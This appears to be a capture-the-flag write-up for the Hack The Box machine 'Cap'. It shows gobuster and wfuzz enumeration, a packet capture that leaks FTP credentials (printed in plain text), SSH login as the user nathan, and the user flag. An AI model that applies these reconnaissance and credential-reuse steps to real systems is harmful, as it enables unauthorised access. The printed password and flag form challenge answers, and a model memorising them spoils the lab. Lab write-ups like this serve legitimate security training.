# Enumeration-
![[Pasted image 20210620042203.png]]
### Using gobuster-
```bash
root@napster:~/Documents/HTB/Cap# gobuster dir -u http://10.10.10.245/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -t 20 -o go
buster                                                                                                                                                        
===============================================================                                                                                               
Gobuster v3.0.1                                                                                                                                               
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                               
===============================================================                                                                                               
[+] Url:            http://10.10.10.245/                                                                                                                      
[+] Threads:        20                                                                                                                                        
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt                                                                  
[+] Status codes:   200,204,301,302,307,401,403                                                                                                               
[+] User Agent:     gobuster/3.0.1                                                                                                                            
[+] Timeout:        10s                                                                                                                                       
===============================================================                                                                                               
2021/06/20 04:29:00 Starting gobuster                                                                                                                         
===============================================================                                                                                               
/data (Status: 302)                                                                                                                                           
/ip (Status: 200)                                                                                                                                             
/capture (Status: 302)                                                                                                                                        
===============================================================                                                                                               
2021/06/20 04:35:28 Finished
```

### Further fuzzing data directory-
```bash
root@napster:~/Documents/HTB/Cap# wfuzz -u http://10.10.10.245/data/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -t 50 --h
c 302 -f wfuzz.txt                                                              
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL site
s. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.245/data/FUZZ
Total requests: 43004

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                       
=====================================================================

000000213:   200        370 L    993 W      17149 Ch    "1"                                                                                           
000000584:   200        370 L    993 W      17146 Ch    "0"                                                                                           
000000933:   200        370 L    993 W      17149 Ch    "01"                                                                                          
000002731:   200        370 L    993 W      17146 Ch    "00"                                                                                          
000004383:   200        370 L    993 W      17146 Ch    "000"                                                                                         
000005319:   200        370 L    993 W      17149 Ch    "001"                                                                                         
000010094:   200        370 L    993 W      17146 Ch    "0000"                                                                                        
000010848:   200        370 L    993 W      17149 Ch    "0001"                                                                                        

Total time: 163.7221
Processed Requests: 43004
Filtered Requests: 42996
Requests/sec.: 262.6645
```
### Visiting any of the above directory we get to download wireshark packet capture-
![[Pasted image 20210620050855.png]]
### Simply Following ftp stream reveals the user & password-
![[Pasted image 20210620051522.png]]

USER nathan
PASS Buck3tH4TF0RM3!

# SSH & User.txt-

```bash
root@napster:~/Documents/HTB/Cap# ssh nathan@10.10.10.245                                                                                          [1306/1306]
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.                                                                                  
ECDSA key fingerprint is SHA256:8TaASv/TRhdOSeq3woLxOcKrIOtDhrZJVrrE0WbzjSc.                                                                                  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                                                                      
Warning: Permanently added '10.10.10.245' (ECDSA) to the list of known hosts.                                                                                 
nathan@10.10.10.245's password:                                                                                                                               
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)
<SNIP>
Last login: Sun Jun 20 08:56:39 2021 from 10.10.14.12                                                                                                         
nathan@cap:~$ ls -la                                                                                                                                          
total 28                                                                                                                                                      
drwxr-xr-x 3 nathan nathan 4096 May 27 09:16 .
drwxr-xr-x 3 root   root   4096 May 23 19:17 ..
lrwxrwxrwx 1 root   root      9 May 15 21:40 .bash_history -> /dev/null
-rw-r--r-- 1 nathan nathan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 nathan nathan 3771 Feb 25  2020 .bashrc
drwx------ 2 nathan nathan 4096 May 23 19:17 .cache
-rw-r--r-- 1 nathan nathan  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 May 27 09:16 .viminfo -> /dev/null
-r-------- 1 nathan nathan   33 Jun 20 08:56 user.txt
nathan@cap:~$ cat user.txt 
042830cc9ef6989a260011839f9ec610
```